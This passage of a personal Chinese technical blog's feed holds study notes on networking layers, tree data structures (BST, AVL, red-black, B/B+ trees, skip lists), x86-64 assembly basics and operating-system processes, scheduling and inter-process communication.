解调（Demodulation）：从接收到的信号中还原出原始比特流

虽然在现代局域网中调制已不常见，但在广域网、无线通信中仍然广泛使用。

总结可以将五层模型简单地图示如下：
应用层       ← 提供网络应用服务（如网页、邮件）传输层       ← 端到端通信，确保可靠或快速传输网络层       ← 跨网络寻址与路由，主机之间建立路径数据链路层   ← 相邻设备之间的数据帧传输（同一个链路）物理层       ← 0 和 1 的物理信号化与真实传输

数据在发送时是自上而下封装的，从应用层逐层打包，到物理层转成信号发出；接收时则反过来，从物理层接收信号，逐层还原数据直到应用层。
]]></content>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Hey, there~</title>
    <url>/2025/03/18/%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[介绍Hey, there~
使用的 hexo + butterfly 生成的静态页面,部署在 Github 个人主页
之后应该会记录一些自己的学习笔记
主要学习和工作方向是安全研发,但是目前工作内容很杂,因此记录的内容也会涉及不同的领域
]]></content>
      <tags>
        <tag>闲话</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构</title>
    <url>/2025/04/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[快速回忆下大学的数据结构课， 这些看完， 大概下面这些能理解一点啦~

树
二叉查找树
完全二叉树
平衡二叉树
n叉树
树的遍历
B+树
跳表
红黑树
AVL树
B树

树的基本概念学习树的基础是理解更复杂的树结构（如红黑树、AVL树等）的前提。让我们从最基本的树概念开始。
树（Tree）是一种非线性的数据结构，由节点（Node）组成，节点之间通过边（Edge）连接。树的结构很像倒立的家谱图或者文件系统的结构。
树是由根节点（Root）开始，经过多个层级的分支（Branch），直到叶子节点（Leaf）
树的基本术语：
根节点（Root）：树的起始节点，没有父节点。
节点（Node）：树中的每个元素，包含数据部分以及指向其他节点的指针（或引用）。
边（Edge）：节点之间的连接。
子节点（Child）：直接连接到某个节点的节点，称为该节点的子节点。
父节点（Parent）：一个节点的直接连接节点是它的父节点。
叶子节点（Leaf）：没有子节点的节点。
高度（Height）：树的高度是从根节点到最深的叶子节点的最长路径的长度（也可以理解为树的层级数）。
深度（Depth）：节点的深度是从根节点到该节点的路径长度。
层级（Level）：树中的每一层，通常层级从0开始（根节点是第0层）。

树的类型树可以有不同的形式，以下是几种常见的树类型：
二叉树 (Binary Tree)
定义：每个节点最多有两个子节点，通常称为左子节点和右子节点。
特点：
每个节点最多有两个子节点。
二叉树的每个节点可以有不同数量的子节点（0个、1个或2个）。


用途：二叉树是很多复杂树结构的基础，例如二叉查找树、堆等。

二叉查找树 (Binary Search Tree, BST)
定义：它是一种特殊的二叉树，节点的左子树上的所有值都小于节点的值，右子树上的所有值都大于节点的值。
特点：
左子树的所有节点的值都小于根节点。
右子树的所有节点的值都大于根节点。
这使得搜索操作可以通过比较快速地确定走向左子树还是右子树。


用途：用于实现高效的查找、插入、删除等操作。

完全二叉树 (Complete Binary Tree)
定义：一个二叉树，除了最后一层外，其他层都是满的，并且最后一层的节点都靠左排列。
特点：
除了最后一层，其他层的节点数量都是满的。
最后一层的节点从左到右填充。


用途：常用于堆（如大顶堆和小顶堆）等数据结构。

平衡二叉树 (Balanced Binary Tree)
定义：平衡二叉树是一种二叉树，要求每个节点的左右子树高度差不超过一定的范围（如 AVL 树就是一种平衡二叉树）。
特点：
保证树的高度较低，避免树退化成链表。
高效的查找、插入和删除操作。


用途：如 AVL 树、红黑树等，广泛用于数据库索引。

n叉树 (n-ary Tree)
定义：n叉树是每个节点最多有n个子节点的树。
特点：
每个节点最多有n个子节点。
常用于表示具有多层次的复杂数据结构，如文件系统。



树的遍历树的遍历是指访问树中所有节点的过程。常见的树的遍历方式有三种：
前序遍历 (Preorder Traversal)
步骤：先访问当前节点，然后递归地前序遍历左子树，再递归地前序遍历右子树。
顺序：根节点 → 左子树 → 右子树。

中序遍历 (Inorder Traversal)
步骤：递归地中序遍历左子树，访问当前节点，然后递归地中序遍历右子树。
顺序：左子树 → 根节点 → 右子树。
特点：二叉查找树的中序遍历结果是按从小到大的顺序排列的。

后序遍历 (Postorder Traversal)
步骤：递归地后序遍历左子树，再递归地后序遍历右子树，然后访问当前节点。
顺序：左子树 → 右子树 → 根节点。

层次遍历 (Level Order Traversal)
步骤：按层级遍历树的节点，通常使用队列来实现。
顺序：根节点 → 第一层 → 第二层 → 第三层 → ……直到最后一层。

树的应用树作为一种数据结构，有许多实际应用，常见的包括：

文件系统：文件和目录组织成树形结构，根目录是树的根节点，文件和文件夹是节点。
数据库索引：树结构（如B树、B+树）常用于数据库的索引，帮助快速查找数据。
游戏决策树：用于表示游戏中的可能决策路径。


二叉查找树（Binary Search Tree, BST）定义二叉查找树是一种特殊的二叉树，满足以下性质：

每个节点最多有两个子节点。
左子树中所有节点的值小于根节点。
右子树中所有节点的值大于根节点。
每一棵子树也都是一棵二叉查找树。

操作查找（Search）
从根节点开始：

如果目标值等于当前节点，返回。
如果目标值小于当前节点，进入左子树。
如果目标值大于当前节点，进入右子树。

查找的时间复杂度与树的高度有关，最坏是 O(n)，最优是 O(log n)。
插入（Insert）
插入值时，按查找路径向下走，找到空位插入即可，不会破坏 BST 结构。
删除（Delete）
分三种情况处理：

删除叶子节点，直接删除。
删除只有一个子节点的节点，用子节点替换该节点。
删除有两个子节点的节点，找到该节点的中序后继或中序前驱，用它的值替换当前节点，再删除那个节点。

问题：BST 可能退化成链表如果连续插入有序数据，例如 1、2、3、4、5，树就会变成单边链表，导致查找效率退化为 O(n)。
为了解决这个问题，就需要引入“自平衡”的机制，也就是平衡二叉树。

平衡二叉树的基本思想什么是平衡树的高度决定了查找、插入、删除的效率。所谓平衡，是指尽量保持每个节点的左右子树高度差不要太大，避免形成单边长链。
平衡树的目标是让树的高度保持在 O(log n) 以内，从而提高整体性能。
平衡的实现手段：旋转操作当插入或删除节点后导致失衡，可以通过旋转操作让树重新平衡。
左旋
将某个节点的右子节点提升为新的父节点，原父节点变为其左子节点。
例子： 节点 A 有右子节点 B，B 再有右子节点 C
原始结构：    A     \      B       \        C左旋后：    B   / \  A   C

右旋
将某个节点的左子节点提升为新的父节点，原父节点变为其右子节点。
例子： 节点 C 有左子节点 B，B 再有左子节点 A
原始结构：    C   /  B /A右旋后：    B   / \  A   C

通过这些旋转，可以动态调整树结构，使其保持平衡。

红黑树简介红黑树是自平衡的二叉查找树，它使用颜色和旋转来控制树的高度。
红黑树不是严格平衡的，但它能保证最长路径不会超过最短路径的两倍，因此效率稳定。
红黑树的五个性质
每个节点是红色或黑色。
根节点必须是黑色。
所有叶子节点（NIL 节点）是黑色。
如果一个节点是红色的，则它的两个子节点必须是黑色的（不能连续两个红色节点）。
从任意节点到其所有叶子节点的路径上，包含的黑色节点数量必须相同。

这些性质共同保证了树的平衡性。

总结
普通二叉查找树查找效率依赖于树高，可能退化成链表。
平衡二叉树通过旋转操作保持结构平衡，提升查找、插入、删除性能。
红黑树是一种宽松的平衡树，通过颜色约束加旋转来维持近似平衡。
红黑树是很多底层库和系统（如 Java TreeMap、C++ STL、Linux 内核）使用的高效结构。


红黑树与 AVL 性能对比，如何选型这是一个很实用、也很容易被误解的问题。我们来进行一次实事求是的对比，站在工程实践的角度，讲清楚 红黑树 vs AVL 树 的性能差异、适用场景、优缺点、如何选型。

红黑树与 AVL 树的核心差异


比较点
AVL 树
红黑树



平衡性
严格平衡（左右子树高度差 ≤ 1）
相对平衡（通过颜色规则控制）


插入效率
较慢，可能频繁旋转
较快，旋转次数更少


删除效率
更慢（容易失衡）
更快（更容忍不平衡）


查找效率
稍快（更矮更“紧凑”）
稍慢（更高一些）


实现复杂度
中等
略高，染色逻辑更麻烦


实际树高
log(n)，更低
最坏 2log(n)，略高但可接受


应用场景
查找密集
插入&#x2F;删除频繁



时间复杂度对比（理论上相同）


操作
AVL
红黑树



查找
O(log n)
O(log n)


插入
O(log n) + 最多 2 次旋转
O(log n) + 最多 3 次旋转 + 染色


删除
O(log n) + 最多 log n 次旋转
O(log n) + 最多 3 次旋转 + 染色


注意：红黑树旋转次数少于 AVL，是因为它更“宽松”地控制平衡。

为什么工程中更常用红黑树？1. 插入、删除性能更稳定AVL 树插入删除操作中需要频繁调整结构（旋转），因为它追求高度的平衡性。虽然这保证了查找很快，但维护成本高。
红黑树采用更“保守”的平衡策略，调整动作较少，整体吞吐量更好。这在系统级开发中非常重要，比如操作系统、数据库、语言运行时。
2. 插入&#x2F;删除频率高时，红黑树吞吐量优于 AVLAVL树适合“读多写少”的场景，比如缓存系统。
红黑树适合“读写都频繁”的场景，比如内核调度、任务队列、映射表等。

实际案例对比Java TreeMap &#x2F; TreeSet
使用的是 红黑树 实现
原因：Java中集合类通常面对频繁插入和删除（如实时排序、排名等），红黑树性能更均衡

C++ STL 的 std::map &#x2F; std::set
也使用的是 红黑树
同样考虑的是泛型容器的插入&#x2F;删除复杂度

Linux 内核调度器 &#x2F; 时间红黑树（RB-tree）
使用的是红黑树（见 include/linux/rbtree.h）
因为调度器中的进程插入&#x2F;删除频繁，而查找不一定多，所以使用红黑树性能更佳


什么时候选 AVL 树？虽然工程里红黑树更常见，但 AVL 并不是没用，它在以下场景下依然有价值：

对查找性能要求极致，数据变动频率低的场景
如内存索引、缓存服务、读密集型数据库


数据量适中，性能压力可控，希望保证查找时间始终最优

比如：一个静态配置中心，你预先插入一些配置项，然后主要是查找访问。用 AVL 是合理的。

工程选型建议总结


场景
推荐结构
原因



查找频繁、插入删除极少
AVL
查找快，保持严格平衡


插入&#x2F;删除频繁，查找适中
红黑树
性能更均衡，旋转少


需要范围查询
B+树
存储系统常用结构（如数据库）


高并发环境下
并发跳表 &#x2F; 哈希表
红黑树&#x2F;AVL 不擅长并发控制


内核、调度系统
红黑树
插入&#x2F;删除频繁，吞吐量更重要


学术 &#x2F; 教学用
AVL
更容易推导、理解平衡原理



总结一句话红黑树是工业界的主流选型，因为它在保持平衡和性能之间做了非常合理的权衡。
而 AVL 更适合做“查找效率最优”的算法研究、教学或低变更场景。
B树、B+树、跳表非常好，接下来我们进入数据库&#x2F;存储系统中常用的三种结构：B树、B+树、跳表，它们都是用于范围查找、批量排序、动态插入删除等复杂需求下的数据结构。
我会按这个顺序讲解：

先讲 B 树：基础结构，理解它是后续 B+ 树的前提
再讲 B+ 树：数据库索引、文件系统最常用结构
最后讲跳表：高性能内存结构，Redis 的最爱

每一个我们都会涵盖：

是什么（直观理解）
如何组织数据
查找&#x2F;插入&#x2F;删除怎么做
为什么它适合某类场景


B 树（Balanced Tree &#x2F; 多路平衡查找树）是什么B 树是一种多路搜索树，是对二叉搜索树的推广。每个节点不仅可以有两个子节点，而是可以有多个。广泛用于磁盘存储、数据库索引结构中，因为它减少了磁盘读写次数。
特点
每个节点最多有 m-1 个数据项，m 个子指针（m 是阶数）
所有节点的关键字保持有序
插入、删除后依然保持平衡
所有叶子节点在同一层（树高固定）

举例（以3阶 B 树为例）
一个节点最多 2 个键，最多有 3 个子节点
比如节点中有 [10, 20]，它的子树范围：
子树1：小于 10
子树2：10~20
子树3：大于 20



查找和二分查找类似：

从根节点开始，在节点中查找关键字位置（可以使用二分）
找不到则沿对应子树向下

时间复杂度为 O(log n)，但每一层“跨度大”，所以树的高度更低，查找更快
插入
找到插入位置，插入键
如果节点已满，就分裂节点，中间值“上提”到父节点
插入可能从叶子一路调整到根节点，最多增加一层高度

删除
类似 BST，找到值删掉
如果节点删除后不满足最小关键字数量，就需要向兄弟借值或合并节点
复杂度 O(log n)

应用场景
MySQL 的 MyISAM 引擎使用的是 B 树索引
适合中等范围查询、单点查找、插入删除都频繁的磁盘结构


B+ 树（B Tree 的增强版）是什么B+ 树是 B 树的一个变种，所有值都存在叶子节点，非叶子节点只做“导航”。
MySQL InnoDB、文件系统、LevelDB 等都使用 B+ 树作为索引结构。
和 B 树的区别


特性
B 树
B+ 树



数据存储
所有节点存数据
只有叶子节点存数据


内部节点
数据 + 导航
仅导航（索引）


查找路径
可提前终止
一定走到叶子节点


范围查询
差
强（叶子节点有链表）


特点
所有叶子节点通过链表串起来，方便范围查询
非叶子节点只做索引，节省空间，扇出更高，树更矮
结构更适合磁盘块对齐，减少 IO 次数

查找
和 B 树类似，但一定查到叶子节点才能拿到数据
路径更统一，便于实现

范围查询
特别高效，只需要找到范围起点，然后从链表顺着读下去即可

应用场景
数据库索引（MySQL InnoDB）
文件系统（如 NTFS, XFS）
批量范围读取、数据分页、高并发写场景


跳表（Skip List）是什么跳表是一种通过在链表上建立多级索引的方式实现快速查找的数据结构。
你可以理解为：链表 + 多层快速通道，是“概率化”实现的平衡树。
结构
底层是有序链表（维护所有元素）
每一层随机选取一些节点参与“快速通道”
每一层都是下一层的子集，最顶层最稀疏

比如有 16 个节点，可能层结构像这样：
Level 3:      A --------- HLevel 2:      A ---- E -- H -- MLevel 1: A - B - C - D - E - F - G - H - I - ... - P

查找
从顶层开始，逐层往下，直到定位到目标位置
每次跳跃跨度大，大大加快查找速度

平均时间复杂度：O(log n)
插入 &#x2F; 删除
插入新节点后，按概率决定它会出现在多少层（比如 Redis 是1&#x2F;4 概率上升一层）
删除也是先找到节点，再清理所有层级中的引用

时间复杂度：O(log n)
应用场景
Redis 的 zset（有序集合）使用跳表实现
比树更容易实现，适合内存结构、并发场景
查找、插入、删除都非常高效
不需要复杂的旋转、维护，代码比平衡树更简单


三者对比总结


特性
B 树
B+ 树
跳表



查找效率
O(log n)
O(log n)
O(log n)


插入&#x2F;删除
O(log n)
O(log n)
O(log n)（更简单）


是否适合磁盘
是
是（最佳）
否，适合内存


是否适合范围查询
一般
强（链表）
强（链表）


实现复杂度
中
中高
低（逻辑简单）


工程应用
MyISAM索引
InnoDB索引，文件系统
Redis zset、有序内存结构



总结建议
数据库磁盘索引：使用 B+ 树。查找、范围查询快，IO次数少，MySQL&#x2F;Oracle&#x2F;SQLite都用它。
键值对内存结构（Redis）：用跳表。简单好用，查找&#x2F;插入性能稳定。
老的存储结构或小范围索引：B 树也能用，但现在基本被 B+ 树取代。


B树和B+树对比
B树 和 B+树 都是自平衡的多路查找树，它们通过分支节点和数据节点组织数据，确保了对大规模数据的高效查找。
B+树 相比于 B树，更加高效，特别是在 范围查询 和 顺序访问 上，因此在数据库和文件系统中，B+树的应用更加广泛。
B树 适合需要 较少的范围查询 或 较均衡的查找操作 的场景，而 B+树 更适合 大规模数据存储、范围查询和顺序扫描 的场景。


什么是 AVL 树？AVL 树 是一种 自平衡的二叉查找树（Binary Search Tree, BST），它的全称是：
Adelson-Velsky and Landis Tree由两位苏联科学家在 1962 年提出，是世界上第一个自平衡二叉查找树。

AVL 树的核心特性自平衡的定义对于 树中的每一个节点，都必须满足：
左子树和右子树的高度差 ≤ 1
这个高度差我们称为该节点的 平衡因子（Balance Factor），它的取值只能是：

-1（右子树比左子树高一层）
0（左右等高）
+1（左子树比右子树高一层）

一旦插入或删除节点后某个节点的平衡因子超过这个范围（比如变成了 2 或 -2），就需要通过旋转操作来恢复平衡。

为什么需要 AVL 树？普通的二叉查找树（BST）在最坏情况下会退化成链表，导致操作效率变为 O(n)。而 AVL 树通过强制控制“平衡因子”，保持树高度为 O(log n)，确保：

查找（Search）
插入（Insert）
删除（Delete）

这些操作都能在对数时间内完成。

AVL 树的旋转操作单旋（Single Rotation）
右旋（Right Rotation）用于左子树过高（LL 失衡）
左旋（Left Rotation）用于右子树过高（RR 失衡）

双旋（Double Rotation）
先左旋再右旋（Left-Right Rotation）用于插入到左子树的右子树（LR 型失衡）
先右旋再左旋（Right-Left Rotation）用于插入到右子树的左子树（RL 型失衡）


操作复杂度


操作
时间复杂度



查找
O(log n)


插入
O(log n)（可能旋转）


删除
O(log n)（可能多次旋转）


AVL 树高度非常低，接近 log₂(n)，因此查找性能极优。

示例假设我们依次插入以下节点：10 → 20 → 30
普通 BST 结构变成：
10  \   20     \      30

此时树高度为 3，已经失衡，AVL 会做一次左旋，变成：
20   /  \  10  30

保持了平衡。

AVL 树 vs 红黑树


对比项
AVL 树
红黑树



平衡程度
更严格（左右子树高差 ≤ 1）
较宽松（限制黑节点数目）


插入&#x2F;删除效率
较慢，旋转多
较快，旋转少


查找效率
稍快
稍慢


实际应用
内存查找、读多写少
系统结构、写操作多


实现复杂度
中
高



适用场景
查找频率高，插入&#x2F;删除少的场景，如内存中的索引结构
不适合频繁更新的场景，因为每次插入&#x2F;删除都可能触发旋转


B树与平衡二叉查找树的对比


特性
B树
平衡二叉查找树（如 AVL 树、红黑树）



适用场景
大规模数据存储，尤其是磁盘存储；数据库索引，文件系统管理
内存中的动态数据存储，集合、映射、优先队列等


树的结构
多路树，每个节点有多个子节点
二叉树，每个节点最多有两个子节点


查找性能
O(log n)，但通常更适合磁盘存储，减少磁盘访问次数
O(log n)，在内存中查找非常高效


节点大小
每个节点包含多个键和多个子指针，适合减少磁盘访问次数
每个节点只包含一个键和最多两个子指针


插入&#x2F;删除操作
节点分裂&#x2F;合并，通常需要更复杂的操作来保持平衡
旋转操作，通过保持平衡因子来保证平衡


支持范围查询
非常高效，能够快速查找和遍历范围数据
支持范围查询，但对于大量范围查询不如 B 树高效


内存与存储
适合外存存储，能高效处理大量数据
适用于内存数据管理，数据规模适中，内存存储


]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编</title>
    <url>/2025/07/07/%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[针对amd架构的汇编有Intel和AT&amp;T两种语法， 下面的介绍都是以Intel语法为主进行说明，主要是针对的系统是System V ABI，Linux，也是目前主流的情况
寄存器通用寄存器


名称
用途简述



RAX
主累加器（函数返回值）


RBX
基址寄存器


RCX
循环计数、参数寄存器


RDX
乘法&#x2F;除法辅助、参数


RSI
源索引（字符串操作）


RDI
目标索引，函数第一个参数


RBP
栈基址（Base Pointer）


RSP
栈顶指针（Stack Pointer）


R8
新增参数寄存器


R9
新增参数寄存器


R10
通用


R11
通用


R12
通用


R13
通用


R14
通用


R15
通用


特殊的寄存器


寄存器
说明



RIP
指令指针寄存器（程序计数器）


RSP
栈顶指针


RBP
栈帧基址


RFLAGS
状态标志寄存器


位宽访问每个 64 位寄存器都可以访问其低位部分。以 RAX 为例：



位宽
名称
说明



64位
RAX
全寄存器


32位
EAX
低 32 位


16位
AX
低 16 位


8位高
AH
AX 的高 8 位


8位低
AL
AX 的低 8 位


对于 R8 ~ R15 等新寄存器：



位宽
示例



64位
R8


32位
R8D


16位
R8W


8位
R8B


函数调用参数传递64位Linux中，函数的前 6 个参数通过寄存器传递：



参数位置
寄存器



第1个
RDI


第2个
RSI


第3个
RDX


第4个
RCX


第5个
R8


第6个
R9


返回值
RAX


超出部分通过栈传递（push）
数据单位


类型
英文缩写
位宽
字节数
举例值



字节
byte (db)
8 位
1 字节
0x7F


字
word (dw)
16 位
2 字节
0x1234


双字
dword (dd)
32 位
4 字节
0x12345678


四字
qword (dq)
64 位
8 字节
0x123456789ABCDEF0


指令下面是常见指令，需要注意的是，虽然有很多的“相当于”，但是不代表可以直接代替，比如直接操作rip寄存器是违法操作，要通过jmp、ret这些命令来代替
movmov rax, rbx

相当于
rax = rbx

addadd rax, rbx

相当于
rax = rax + rbx

subsub rax, rbx

相当于
rax = rax - rbx

incinc rax

相当于
rax = rax + 1

decdec rax

相当于
rax = rax - 1

andand rax, rbx

相当于对rax和rbx按位与，结果赋值给rax
oror rax, rbx

相当于对rax和rbx按位或，结果赋值给rax
xorxor rax, rbx

相当于对rax和rbx按位异或，结果赋值给rax
notnot rax

相当于对rax按位取反，结果赋值给rax
cmpcmp rax, rbx

对rax和rbx进行比较，结果会保存到标志位rflags的ZF、SF、CF、OF标志位中
jecmp rax, rbxje label

相当于条件判断rax和rbx
如果相等就执行
jmp label

其他的还有jne、jg、jl
leaveleave

相当于
mov rsp, rbppop rbp

syscallmov rax, 60mov rdi, 0syscall

相当于
exit(0)

这里exit是系统调用，对应系统调用号为60，通过rax来记录，然后需要的参数通过rdi、rsi、rdx、rcx、r8、r9….这些来传
pushpush rax

相当于
sub rsp, 8mov [rsp], rax

mov [rsp]， rax表示把rax的值写入rsp的值指向的地址处
poppop rax

相当于
mov rax, [rsp]add rsp, 8

这里mov rax, [rsp]表示把rsp栈顶指针指向地址处的值给取出来，然后赋值给rax
jmpjmp label

相当于
mov rip, address of label



jmp rax

相当于
mov rip, rax

cmpcmp rax,

callcall my_function

相当于
push ripjmp my_function

retret

相当于
pop rip

也会见到retn，跟ret等价
lea用于计算地址的（设计上是这样的目的，当然功能很强大所以也可以单纯拿来算东西）
能接受的数据格式是这样的
[base + index*scale + displacement]

所以这些是不允许的
lea eax, [ecx * 3]     ; 错误，scale 只能是 1/2/4/8lea eax, [ecx + edx + ebx] ; 错误，最多只能加两个寄存器（base + index）

主要用法包括这些



用法类型
示例



地址计算
lea eax, [ebx+4]


数学计算
lea eax, [ecx*2 + 8]


获取数组元素地址
lea eax, [array + index * 元素大小]


获取结构体成员地址
lea eax, [esi + 偏移]


当然LEA 不只用于地址，还可以这样



用法类别
示例
说明



地址计算
lea eax, [esi + edi*4 + 8]
典型场景：结构体&#x2F;数组元素地址计算


代替加法
lea eax, [ebx + 10]
等效于：add eax, 10


代替乘法
lea eax, [ecx*2]
等效于：eax = ecx * 2


代替组合计算
lea eax, [ebx + ecx*4 + 16]
等效于：eax = ebx + ecx * 4 + 16


变相实现 imul
lea eax, [ecx + ecx*2]
等效于：eax = ecx * 3


]]></content>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统</title>
    <url>/2025/04/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[操作系统的基本概念什么是操作系统操作系统（Operating System，简称 OS）是管理计算机硬件和软件资源的系统程序，是用户与硬件之间的中介。它负责管理 CPU、内存、磁盘、外设等资源，调度任务的执行，并为应用程序提供统一的接口。
常见的操作系统包括 Linux、Windows、macOS、Android、iOS 等。不同的操作系统在用户体验、系统结构和调度策略上各有差异，但其核心机制大体相似。

操作系统的主要功能进程管理进程是正在运行的程序实例。操作系统负责创建、调度、终止进程，并提供进程间通信（IPC）机制。多进程系统可以并发运行多个任务，提高资源利用率。
内存管理操作系统需要管理所有程序的内存空间，避免冲突，并提供抽象的虚拟地址空间，使得每个程序看似拥有完整的内存。分页、分段、交换空间（Swap）等技术常用于内存管理。
文件系统文件系统是组织和存储数据的结构方式。它定义了文件的命名、权限、目录结构、读写方式等。常见的文件系统包括 FAT32、NTFS、ext4 等。
设备管理所有硬件设备如硬盘、网络卡、显示器等都通过驱动程序与操作系统交互。操作系统负责管理这些设备的访问权限、调度和数据传输。
用户接口操作系统提供命令行界面（CLI）或图形用户界面（GUI），作为用户与系统交互的桥梁。例如 bash、cmd、GNOME 等。

进程管理什么是进程进程（Process）是操作系统资源分配的基本单位，是程序在运行时的一个实例。一个程序可以对应多个进程，比如打开多个浏览器窗口，每一个窗口就是一个进程。
操作系统通过进程来实现多任务运行，每个进程都有自己的地址空间、代码、数据和运行状态。

进程与程序的区别程序是静态的代码文件，是指令和数据的集合，而进程是程序执行时的动态实体。程序可以看作是进程的模板。
简单说，程序是“静止”的，进程是“活着”的。

进程的状态一个进程在生命周期中通常会经历以下几种状态：

就绪（Ready）：进程已准备好运行，等待 CPU 分配时间片。
运行（Running）：进程正在使用 CPU 运行指令。
阻塞（Blocked）：进程等待某个事件（如 I&#x2F;O 完成）而暂停运行。
终止（Terminated）：进程运行结束，资源被回收。
新建（New）：刚创建，还未就绪。
挂起（Suspended）：被系统暂停，可能因资源限制或人工干预。


上下文切换（Context Switch）多进程系统中，操作系统需要在不同进程之间切换 CPU 使用权。为了让切换透明且安全，系统会在切换前保存当前进程的状态（寄存器、程序计数器、堆栈指针等），切换后再恢复另一个进程的状态。
这种切换过程称为上下文切换。虽然切换频繁带来了并发体验，但频繁上下文切换会引起性能损耗。

线程与进程的关系线程（Thread）是比进程更小的执行单元。多个线程可以共享同一个进程的资源（如内存），但它们有自己的栈和寄存器。

进程是资源分配的单位，线程是 CPU 调度的单位。
线程切换的开销比进程小，因此多线程常用于高性能并发编程。


多进程与多线程的对比


特性
多进程
多线程



内存空间
每个进程独立
同一进程的线程共享空间


创建开销
较大
较小


通信方式
使用进程间通信（IPC）
直接共享内存，需同步控制


稳定性
一个进程崩溃不会影响其他
一个线程崩溃可能影响整个进程


适用场景
安全隔离、重任务分工
轻量级并发、高 IO 效率



进程调度算法操作系统在多个进程之间分配 CPU 的方式称为调度。不同的调度算法适用于不同场景：

先来先服务（FCFS）：按进程到达顺序排队处理，简单但不公平。
短作业优先（SJF）：优先处理运行时间短的任务，平均等待时间短，但可能饿死长任务。
时间片轮转（RR）：给每个进程分配固定时间片，公平性好，适合分时系统。
优先级调度：按优先级执行高的进程，易导致低优先级进程长时间等待。
多级反馈队列（MLFQ）：动态调整进程优先级，综合考虑响应时间和公平性，复杂但实用。
完全公平调度（CFS）：CFS 通过维护一个 红黑树 来管理所有可执行进程。每个进程会根据其 虚拟运行时间（也称为“权重”或“时间片”）被放置在红黑树中，进程的虚拟运行时间越小，越先被调度执行。Linux默认采用该算法。CFS 设计的目标是确保每个进程（或线程）都能公平地共享 CPU 时间，从而实现较为平衡的性能表现，特别是对于多核和多线程的环境


进程间通信（IPC）当多个进程需要协作时，就必须进行通信。常见的通信方式包括：

管道（Pipe）：一种半双工通信机制，只能在父子进程之间使用。
命名管道（FIFO）：增强版的管道，支持不相关进程间通信。
消息队列：进程以消息为单位进行通信，系统管理消息缓冲区。
共享内存：最高效的通信方式，多个进程访问同一块物理内存，但需要加锁同步。
信号量：主要用于同步机制，避免竞争条件。
套接字（Socket）：支持不同主机之间的进程通信。


同步与互斥当多个线程或进程共享资源时，必须保证数据一致性，避免“竞态条件”（Race Condition）。这需要使用同步和互斥机制：

互斥锁（Mutex）：一段代码在同一时刻只能被一个线程访问。
信号量（Semaphore）：一种计数锁，可以控制访问某资源的线程数。
自旋锁（Spinlock）：不断尝试获取锁，适合锁持有时间短的场景。
条件变量：配合锁使用，实现复杂的等待-唤醒机制。


进程间通信（IPC）在多进程系统中，不同的进程运行在独立的内存空间中，默认情况下彼此之间无法直接访问对方的数据。然而，实际应用中很多任务都需要多个进程协作完成，这就必须依赖进程间通信机制（IPC）来交换数据、传递信号或同步行为。
操作系统提供了多种 IPC 方法，不同的方法适用于不同的场景，权衡了效率、复杂度和安全性。

IPC 的典型用途
数据传输：在进程之间传递数据，例如图像处理中的主进程和工作进程。
事件通知：某进程完成任务后通知另一个进程，如 GUI 与后台服务的交互。
资源共享：多个进程共同使用某个资源时，通过同步机制避免冲突。
进程控制：父进程控制子进程的行为，如终止、暂停、唤醒等。


常见的进程间通信方式管道（Pipe）管道是一种最基础的 IPC 方式，只能在有亲缘关系的进程之间使用，如父子进程。

单向传输，数据只能从写端流向读端。
典型用法：ls | grep &quot;txt&quot;，Shell 会创建两个进程，用管道连接它们的输出和输入。

系统调用：
int pipe(int fd[2]);

fd[0] 是读端，fd[1] 是写端。
命名管道（FIFO）命名管道是管道的增强版本，允许无血缘关系的进程通信，通过文件系统中的特殊文件来标识。

数据读写像文件操作一样进行。
可以跨进程、甚至跨 Shell 通信。
使用 mkfifo() 或 mknod() 创建。

mkfifo /tmp/myfifo

消息队列（Message Queue）消息队列允许进程以消息为单位异步通信。内核负责缓存消息，进程读取时按消息顺序或优先级读取。

支持多生产者、多消费者模型。
消息结构化，通信可靠。
不共享内存，较安全。

系统调用：
msgget(), msgsnd(), msgrcv(), msgctl()

共享内存（Shared Memory）共享内存将一块物理内存映射到多个进程的地址空间，是效率最高的一种通信方式。

多个进程可以同时读写共享区域，适合高频数据交换。
通常需要配合信号量或互斥锁来同步访问，避免数据竞争。
适合大数据量的传输场景，如图像处理、视频编码等。

系统调用：
shmget(), shmat(), shmdt(), shmctl()

信号量（Semaphore）信号量并不直接传输数据，而是用于实现进程间的同步与互斥控制。

类似交通红绿灯，控制进程对共享资源的访问。
信号量可与共享内存搭配使用，实现高效且安全的通信。

系统调用：
semget(), semop(), semctl()

信号（Signal）信号是一种轻量级的通知机制，操作系统通过信号向进程传递事件通知。

类似中断，用于处理如中止、超时、非法访问等事件。
常见信号有 SIGINT（Ctrl+C）、SIGKILL、SIGTERM 等。
可自定义信号处理函数，使用 signal() 或 sigaction() 注册。

套接字（Socket）套接字支持不同主机或本机任意进程之间的通信，是构建网络通信的基础。

分为**本地套接字（Unix Domain Socket）和网络套接字（TCP&#x2F;UDP）**。
本地套接字用于同一台机器内的进程通信，性能高于 TCP 套接字。
网络套接字支持跨主机通信，是分布式系统通信的核心方式。

系统调用：
socket(), bind(), listen(), accept(), connect(), send(), recv()

socket有多种不同类型，比如常见的ip:port是网络套接字



socket 类型
地址格式
用途



AF_INET
IP:PORT
IPv4 网络通信


AF_INET6
[IPv6]:PORT
IPv6 网络通信


AF_UNIX &#x2F; AF_LOCAL
文件路径（如 /tmp/mysock）
本地进程通信（IPC）


AF_PACKET
网络接口 + 协议
底层网络抓包（如 Wireshark）


AF_BLUETOOTH
MAC 地址 + 通道
蓝牙通信


AF_NETLINK
内核通信通道
Linux 内核与用户空间通信



实际开发中如何选择 IPC 方式
对于高频大数据传输：优先使用共享内存 + 同步机制
对于结构化、可靠消息传递：使用消息队列或本地套接字
对于跨主机通信：使用网络套接字（如 TCP）
对于简单通知或事件触发：使用信号或信号量
父子进程间传输：使用管道或共享内存
多线程通信：直接共享内存，配合互斥锁或条件变量


内存管理内存管理的作用内存管理的目标是高效、安全、合理地分配系统内存资源。现代操作系统通过内存管理机制，让每个进程都以为自己拥有完整的独立内存空间，实际上却在后台进行着复杂的资源调度和地址映射。
内存管理不仅负责分配和回收内存，还必须处理内存保护、共享、虚拟化等需求。

